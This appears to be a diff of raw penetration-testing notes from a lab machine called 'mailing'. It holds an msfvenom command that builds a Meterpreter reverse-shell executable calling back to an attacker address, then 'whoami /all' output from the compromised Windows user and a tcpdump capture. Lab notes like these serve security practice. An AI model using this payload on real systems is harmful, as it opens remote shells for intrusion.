@@ -49,3 +49,64 @@ m4y4ngs4ri
 
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.39 LPORT=4444 -f exe -o reverse.exe
+
+
+
+C:\Users\maya\AppData\Local\Temp>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name    SID                                          
+============ =============================================
+mailing\maya S-1-5-21-3356585197-584674788-3201212231-1002
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                   Type             SID          Attributes                                        
+============================================ ================ ============ ==================================================
+Todos                                        Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users              Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Usuarios                             Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Usuarios de escritorio remoto        Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                         Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Usuarios autentificados         Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Esta compa��a                   Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Cuenta local                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Autenticaci�n NTLM              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Etiqueta obligatoria\Nivel obligatorio medio Label            S-1-16-8192                                                    
+
+
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                                  State  
+============================= ============================================ =======
+SeChangeNotifyPrivilege       Omitir comprobaci�n de recorrido             Enabled
+SeUndockPrivilege             Quitar equipo de la estaci�n de acoplamiento Enabled
+SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Enabled
+SeTimeZonePrivilege           Cambiar la zona horaria                      Enabled
+
+
+
+
+
+
+
+
+sudo tcpdump -i lo tcp port 5040 -vvv
+tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+02:09:27.073765 IP (tos 0x0, ttl 64, id 27394, offset 0, flags [DF], proto TCP (6), length 52)
+    localhost.5040 > localhost.54534: Flags [.], cksum 0xfe28 (incorrect -> 0x2854), seq 1540550384, ack 2774666395, win 512, options [nop,nop,TS val 2142884541 ecr 2142869182], length 0
+02:09:27.073774 IP (tos 0x0, ttl 64, id 36971, offset 0, flags [DF], proto TCP (6), length 52)
+    localhost.54534 > localhost.5040: Flags [.], cksum 0xfe28 (incorrect -> 0xd4aa), seq 1, ack 1, win 512, options [nop,nop,TS val 2142884541 ecr 2142759528], length 0
+02:09:42.436687 IP (tos 0x0, ttl 64, id 27395, offset 0, flags [DF], proto TCP (6), length 52)
+    localhost.5040 > localhost.54534: Flags [.], cksum 0xfe28 (incorrect -> 0xb051), seq 0, ack 1, win 512, options [nop,nop,TS val 2142899904 ecr 2142884541], length 0
+02:09:42.436697 IP (tos 0x0, ttl 64, id 36972, offset 0, flags [DF], proto TCP (6), length 52)
+    localhost.54534 > localhost.5040: Flags [.], cksum 0xfe28 (incorrect -> 0x98a7), seq 1, ack 1, win 512, options [nop,nop,TS val 2142899904 ecr 2142759528], length 0
+
